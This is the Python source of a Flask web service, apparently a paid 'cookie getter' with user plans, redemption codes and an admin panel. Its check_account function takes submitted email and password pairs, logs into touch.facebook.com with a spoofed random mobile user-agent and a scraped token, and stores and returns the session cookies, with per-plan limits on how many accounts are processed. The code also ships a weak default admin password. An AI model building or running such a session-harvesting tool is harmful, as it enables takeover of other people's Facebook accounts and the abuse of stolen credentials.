from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_from_directory
import os
import uuid
import random
import re
import time
import requests
import json
import datetime
from functools import wraps
from werkzeug.security import generate_password_hash, check_password_hash
import threading

app = Flask(__name__, static_folder="public", static_url_path="")

# Set secret key from environment variable or generate a random one
app.secret_key = os.environ.get('SECRET_KEY', os.urandom(24))

# File paths
DATA_DIR = 'data'
USERS_FILE = os.path.join(DATA_DIR, 'users.json')
CODES_FILE = os.path.join(DATA_DIR, 'codes.json')
ACTIVITY_LOG_FILE = os.path.join(DATA_DIR, 'activity_log.json')

# Create data directory if it doesn't exist
os.makedirs(DATA_DIR, exist_ok=True)

# Data lock for thread safety
data_lock = threading.Lock()

# Initialize empty data files if they don't exist
def initialize_data_files():
    # Users data with admin account
    if not os.path.exists(USERS_FILE):
        admin_password = os.environ.get('ADMIN_PASSWORD', 'admin123')
        users_data = {
            "admin": {
                "password": generate_password_hash(admin_password),
                "plan": "admin",
                "accounts_processed": 0,
                "max_accounts": 999,
                "accounts": [],
                "created_at": datetime.datetime.now().isoformat(),
                "last_login": None
            }
        }
        with open(USERS_FILE, 'w') as f:
            json.dump(users_data, f, indent=2)
    
    # Redemption codes
    if not os.path.exists(CODES_FILE):
        codes_data = {
            "PREMIUM75": {"plan": "premium", "duration": 30, "active": True},
            "FREECODE": {"plan": "free", "duration": 30, "active": True}
        }
        with open(CODES_FILE, 'w') as f:
            json.dump(codes_data, f, indent=2)
    
    # Activity log
    if not os.path.exists(ACTIVITY_LOG_FILE):
        with open(ACTIVITY_LOG_FILE, 'w') as f:
            json.dump([], f, indent=2)

# Initialize data files
initialize_data_files()

# Helper functions for data access
def load_users():
    with data_lock:
        try:
            with open(USERS_FILE, 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {}

def save_users(users_data):
    with data_lock:
        with open(USERS_FILE, 'w') as f:
            json.dump(users_data, f, indent=2)

def load_codes():
    with data_lock:
        try:
            with open(CODES_FILE, 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {}

def save_codes(codes_data):
    with data_lock:
        with open(CODES_FILE, 'w') as f:
            json.dump(codes_data, f, indent=2)

def log_activity(user_id, action, details=None):
    with data_lock:
        try:
            with open(ACTIVITY_LOG_FILE, 'r') as f:
                logs = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            logs = []
        
        log_entry = {
            "timestamp": datetime.datetime.now().isoformat(),
            "user_id": user_id,
            "action": action,
            "details": details or {}
        }
        logs.append(log_entry)
        
        # Keep only last 1000 entries to prevent file from growing too large
        if len(logs) > 1000:
            logs = logs[-1000:]
        
        with open(ACTIVITY_LOG_FILE, 'w') as f:
            json.dump(logs, f, indent=2)

# Login middleware
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if "user_id" not in session:
            return jsonify({"status": "error", "message": "Authentication required"}), 401
        return f(*args, **kwargs)
    return decorated_function

# Admin middleware
def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if "user_id" not in session:
            return jsonify({"status": "error", "message": "Authentication required"}), 401
        
        users = load_users()
        user_id = session.get('user_id')
        
        if user_id not in users or users[user_id].get('plan') != 'admin':
            return jsonify({"status": "error", "message": "Admin access required"}), 403
            
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.route('/admin')
def admin_panel():
    return app.send_static_file('admin.html')

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    users = load_users()
    
    if not username or not password:
        return jsonify({"status": "error", "message": "Username and password are required"}), 400
    
    # Check if user exists
    if username not in users:
        return jsonify({"status": "error", "message": "Invalid username or password"}), 401
    
    # Check password
    user = users[username]
    if not check_password_hash(user['password'], password):
        return jsonify({"status": "error", "message": "Invalid username or password"}), 401
    
    # Update last login time
    user['last_login'] = datetime.datetime.now().isoformat()
    save_users(users)
    
    # Set session
    session['user_id'] = username
    
    # Log activity
    log_activity(username, "login")
    
    return jsonify({
        "status": "success", 
        "plan": user["plan"],
        "accounts_processed": user["accounts_processed"],
        "max_accounts": user["max_accounts"]
    })

@app.route('/api/register', methods=['POST'])
def register():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')
    
    users = load_users()
    
    if not username or not password:
        return jsonify({"status": "error", "message": "Username and password are required"}), 400
    
    # Check if username already exists
    if username in users:
        return jsonify({"status": "error", "message": "Username already exists"}), 400
    
    # Create new user with free plan
    users[username] = {
        "password": generate_password_hash(password),
        "plan": "free",
        "accounts_processed": 0,
        "max_accounts": 2,
        "accounts": [],
        "created_at": datetime.datetime.now().isoformat(),
        "last_login": datetime.datetime.now().isoformat()
    }
    
    save_users(users)
    
    # Set session
    session['user_id'] = username
    
    # Log activity
    log_activity(username, "register")
    
    return jsonify({
        "status": "success", 
        "plan": "free",
        "accounts_processed": 0,
        "max_accounts": 2
    })

@app.route('/api/redeem', methods=['POST'])
@login_required
def redeem_code():
    data = request.get_json()
    code = data.get('code')
    user_id = session.get('user_id')
    
    if not code:
        return jsonify({"status": "error", "message": "Redemption code is required"}), 400
    
    users = load_users()
    codes = load_codes()
    
    if code not in codes:
        return jsonify({"status": "error", "message": "Invalid redemption code"}), 400
    
    if not codes[code].get("active", True):
        return jsonify({"status": "error", "message": "This code has been deactivated"}), 400
    
    # Update user plan
    redemption = codes[code]
    user = users[user_id]
    user["plan"] = redemption["plan"]
    
    # Update max accounts based on plan
    if redemption["plan"] == "premium":
        user["max_accounts"] = 10
    
    # Add expiry date if applicable
    if redemption.get("duration"):
        now = datetime.datetime.now()
        expiry = now + datetime.timedelta(days=redemption["duration"])
        user["plan_expires"] = expiry.isoformat()
    
    # Save changes
    save_users(users)
    
    # Optionally deactivate the code if it's one-time use
    # codes[code]["active"] = False
    # save_codes(codes)
    
    # Log activity
    log_activity(user_id, "redeem_code", {"code": code, "plan": redemption["plan"]})
    
    return jsonify({
        "status": "success",
        "message": f"Successfully redeemed {redemption['plan']} plan for {redemption['duration']} days",
        "plan": user["plan"],
        "accounts_processed": user["accounts_processed"],
        "max_accounts": user["max_accounts"]
    })

@app.route('/api/logout', methods=['POST'])
def logout():
    user_id = session.get('user_id')
    if user_id:
        log_activity(user_id, "logout")
    
    session.pop('user_id', None)
    return jsonify({"status": "success"})

@app.route('/api/user/profile', methods=['GET'])
@login_required
def get_user_profile():
    user_id = session.get('user_id')
    users = load_users()
    
    if user_id not in users:
        return jsonify({"status": "error", "message": "User not found"}), 404
    
    user = users[user_id]
    
    # Check if plan has expired
    if "plan_expires" in user:
        try:
            expiry_date = datetime.datetime.fromisoformat(user["plan_expires"])
            if datetime.datetime.now() > expiry_date and user["plan"] != "admin":
                user["plan"] = "free"
                user["max_accounts"] = 2
                save_users(users)
        except (ValueError, TypeError):
            pass
    
    return jsonify({
        "status": "success",
        "user_id": user_id,
        "plan": user["plan"],
        "accounts_processed": user["accounts_processed"],
        "max_accounts": user["max_accounts"],
        "plan_expires": user.get("plan_expires")
    })

@app.route('/api/cookie-getter', methods=['POST'])
@login_required
def cookie_getter():
    user_id = session.get('user_id')
    users = load_users()
    user = users[user_id]
    
    # Check if user has reached account limit
    if user["accounts_processed"] >= user["max_accounts"]:
        return jsonify({
            "status": "error", 
            "message": f"You've reached your {user['plan']} plan limit of {user['max_accounts']} accounts"
        }), 403
    
    data = request.get_json()
    email = data.get('email')
    password = data.get('password')
    
    if not email or not password:
        return jsonify({"status": "error", "message": "Email and password are required"}), 400
    
    try:
        result = check_account(email, password)
        
        if result.get("status") == "success":
            # Increment accounts processed
            user["accounts_processed"] += 1
            
            # Store account info
            account_id = str(uuid.uuid4())
            if "accounts" not in user:
                user["accounts"] = []
                
            user["accounts"].append({
                "id": account_id,
                "email": email,
                "cookie": result.get("cookie", ""),
                "created_at": datetime.datetime.now().isoformat()
            })
            
            # Save changes
            save_users(users)
            
            # Log activity
            log_activity(user_id, "add_account", {"email": email, "success": True})
            
            return jsonify({
                "status": "success", 
                "cookie": result.get("cookie", ""),
                "accounts_processed": user["accounts_processed"],
                "max_accounts": user["max_accounts"]
            })
        else:
            # Log failed attempt
            log_activity(user_id, "add_account", {"email": email, "success": False, "error": result.get("message")})
            
            return jsonify({"status": "error", "message": result.get("message", "Failed to log in")})
            
    except Exception as e:
        error_message = str(e)
        # Log error
        log_activity(user_id, "add_account", {"email": email, "success": False, "error": error_message})
        
        return jsonify({"status": "error", "message": error_message}), 500

@app.route('/api/accounts', methods=['GET'])
@login_required
def get_accounts():
    user_id = session.get('user_id')
    users = load_users()
    user = users[user_id]
    
    accounts = user.get("accounts", [])
    # Return only necessary info, not the full cookie data
    safe_accounts = []
    for account in accounts:
        safe_accounts.append({
            "id": account["id"],
            "email": account["email"],
            "created_at": account.get("created_at")
        })
    
    return jsonify({
        "status": "success",
        "accounts": safe_accounts
    })

@app.route('/api/accounts/<account_id>', methods=['GET'])
@login_required
def get_account(account_id):
    user_id = session.get('user_id')
    users = load_users()
    user = users[user_id]
    
    accounts = user.get("accounts", [])
    for account in accounts:
        if account["id"] == account_id:
            return jsonify({
                "status": "success",
                "account": account
            })
    
    return jsonify({"status": "error", "message": "Account not found"}), 404

@app.route('/api/accounts/<account_id>', methods=['DELETE'])
@login_required
def delete_account(account_id):
    user_id = session.get('user_id')
    users = load_users()
    user = users[user_id]
    
    accounts = user.get("accounts", [])
    for i, account in enumerate(accounts):
        if account["id"] == account_id:
            deleted_account = accounts.pop(i)
            if user["accounts_processed"] > 0:
                user["accounts_processed"] -= 1
            
            # Save changes
            save_users(users)
            
            # Log activity
            log_activity(user_id, "delete_account", {"email": deleted_account["email"]})
            
            return jsonify({
                "status": "success",
                "message": "Account deleted successfully",
                "accounts_processed": user["accounts_processed"]
            })
    
    return jsonify({"status": "error", "message": "Account not found"}), 404

# Admin API endpoints
@app.route('/api/admin/users', methods=['GET'])
@admin_required
def get_all_users():
    users = load_users()
    
    # Remove sensitive information
    safe_users = {}
    for username, user_data in users.items():
        safe_users[username] = {
            "plan": user_data["plan"],
            "accounts_processed": user_data["accounts_processed"],
            "max_accounts": user_data["max_accounts"],
            "account_count": len(user_data.get("accounts", [])),
            "created_at": user_data.get("created_at"),
            "last_login": user_data.get("last_login"),
            "plan_expires": user_data.get("plan_expires")
        }
    
    return jsonify({"status": "success", "users": safe_users})

@app.route('/api/admin/users/<username>', methods=['GET'])
@admin_required
def get_user_details(username):
    users = load_users()
    
    if username not in users:
        return jsonify({"status": "error", "message": "User not found"}), 404
    
    user_data = users[username]
    
    # Remove password hash
    safe_user = dict(user_data)
    safe_user.pop("password", None)
    
    # Simplify account data to avoid sending all cookies
    safe_accounts = []
    for account in safe_user.get("accounts", []):
        safe_account = dict(account)
        if "cookie" in safe_account:
            safe_account["has_cookie"] = True
            safe_account.pop("cookie", None)
        safe_accounts.append(safe_account)
    
    safe_user["accounts"] = safe_accounts
    
    return jsonify({"status": "success", "user": safe_user})

@app.route('/api/admin/users/<username>', methods=['PUT'])
@admin_required
def update_user(username):
    users = load_users()
    
    if username not in users:
        return jsonify({"status": "error", "message": "User not found"}), 404
    
    user_data = users[username]
    data = request.get_json()
    
    # Update fields
    if "plan" in data:
        user_data["plan"] = data["plan"]
    
    if "max_accounts" in data:
        user_data["max_accounts"] = data["max_accounts"]
    
    if "accounts_processed" in data:
        user_data["accounts_processed"] = data["accounts_processed"]
    
    if "plan_expires" in data:
        user_data["plan_expires"] = data["plan_expires"]
    
    # Save changes
    save_users(users)
    
    # Log activity
    admin_id = session.get('user_id')
    log_activity(admin_id, "admin_update_user", {"username": username, "changes": data})
    
    return jsonify({"status": "success", "message": f"User {username} updated successfully"})

@app.route('/api/admin/users/<username>', methods=['DELETE'])
@admin_required
def delete_user(username):
    users = load_users()
    
    if username not in users:
        return jsonify({"status": "error", "message": "User not found"}), 404
    
    if username == "admin" or username == session.get('user_id'):
        return jsonify({"status": "error", "message": "Cannot delete admin or current user"}), 400
    
    # Delete user
    del users[username]
    
    # Save changes
    save_users(users)
    
    # Log activity
    admin_id = session.get('user_id')
    log_activity(admin_id, "admin_delete_user", {"username": username})
    
    return jsonify({"status": "success", "message": f"User {username} deleted successfully"})

@app.route('/api/admin/codes', methods=['GET'])
@admin_required
def get_all_codes():
    codes = load_codes()
    return jsonify({"status": "success", "codes": codes})

@app.route('/api/admin/codes', methods=['POST'])
@admin_required
def create_code():
    data = request.get_json()
    code = data.get('code')
    plan = data.get('plan')
    duration = data.get('duration')
    
    if not code or not plan or not duration:
        return jsonify({"status": "error", "message": "Code, plan, and duration are required"}), 400
    
    codes = load_codes()
    
    if code in codes:
        return jsonify({"status": "error", "message": "Code already exists"}), 400
    
    # Create new code
    codes[code] = {
        "plan": plan,
        "duration": int(duration),
        "active": True,
        "created_at": datetime.datetime.now().isoformat()
    }
    
    # Save changes
    save_codes(codes)
    
    # Log activity
    admin_id = session.get('user_id')
    log_activity(admin_id, "admin_create_code", {"code": code, "plan": plan, "duration": duration})
    
    return jsonify({"status": "success", "message": f"Code {code} created successfully"})

@app.route('/api/admin/codes/<code>', methods=['PUT'])
@admin_required
def update_code(code):
    codes = load_codes()
    
    if code not in codes:
        return jsonify({"status": "error", "message": "Code not found"}), 404
    
    data = request.get_json()
    
    # Update fields
    if "plan" in data:
        codes[code]["plan"] = data["plan"]
    
    if "duration" in data:
        codes[code]["duration"] = int(data["duration"])
    
    if "active" in data:
        codes[code]["active"] = data["active"]
    
    # Save changes
    save_codes(codes)
    
    # Log activity
    admin_id = session.get('user_id')
    log_activity(admin_id, "admin_update_code", {"code": code, "changes": data})
    
    return jsonify({"status": "success", "message": f"Code {code} updated successfully"})

@app.route('/api/admin/codes/<code>', methods=['DELETE'])
@admin_required
def delete_code(code):
    codes = load_codes()
    
    if code not in codes:
        return jsonify({"status": "error", "message": "Code not found"}), 404
    
    # Delete code
    del codes[code]
    
    # Save changes
    save_codes(codes)
    
    # Log activity
    admin_id = session.get('user_id')
    log_activity(admin_id, "admin_delete_code", {"code": code})
    
    return jsonify({"status": "success", "message": f"Code {code} deleted successfully"})

@app.route('/api/admin/logs', methods=['GET'])
@admin_required
def get_activity_logs():
    limit = request.args.get('limit', default=100, type=int)
    
    with data_lock:
        try:
            with open(ACTIVITY_LOG_FILE, 'r') as f:
                logs = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            logs = []
    
    # Return most recent logs first
    logs.reverse()
    return jsonify({"status": "success", "logs": logs[:limit]})

def check_account(uid, pww):
    amazon = ["E6653", "E6633", "E6853", "E6833", "F3111", "F3111 F3113", "F5122", 
              "F3111 F3113", "SO-04H", "F3212", "F3311", "F8331", "SO-02J", "G3116", "G8232"]
    ua = f"Mozilla/5.0 (Linux; Android {random.randint(4,13)}; {random.choice(amazon)}; Windows 10 Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/{random.randint(84,106)}.0.{random.randint(4200,4900)}.{random.randint(40,140)} Mobile Safari/537.36"
    
    try:
        session = requests.Session()
        git_fb = session.get("https://touch.facebook.com/pages/create/?ref_type=registration_form").text
        
        # Extract lsd token
        lsd_match = re.search(r'"lsd":"(.*?)"', str(git_fb))
        if not lsd_match:
            raise Exception("Failed to extract LSD token")
        
        lsd = lsd_match.group(1)
        
        _data = {
            'lsd': lsd,
            'email': uid,
            'encpass': f'#PWD_BROWSER:0:{int(time.time())}:{pww}'
        }
        
        _header = {
            'authority': 'touch.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '1.8937500715255737',
            'origin': 'https://touch.facebook.com',
            'referer': 'https://touch.facebook.com/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
            'viewport-width': '980'
        }
        
        url = 'https://touch.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110'
        session.post(url, data=_data, headers=_header, allow_redirects=False)
        
        login_cookies = session.cookies.get_dict()
        
        if "c_user" in login_cookies:
            cookie_string = "; ".join([f"{key}={value}" for key, value in login_cookies.items()])
            return {"status": "success", "cookie": cookie_string}
        else:
            return {"status": "error", "message": "Login failed"}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(debug=False, host='0.0.0.0', port=port)
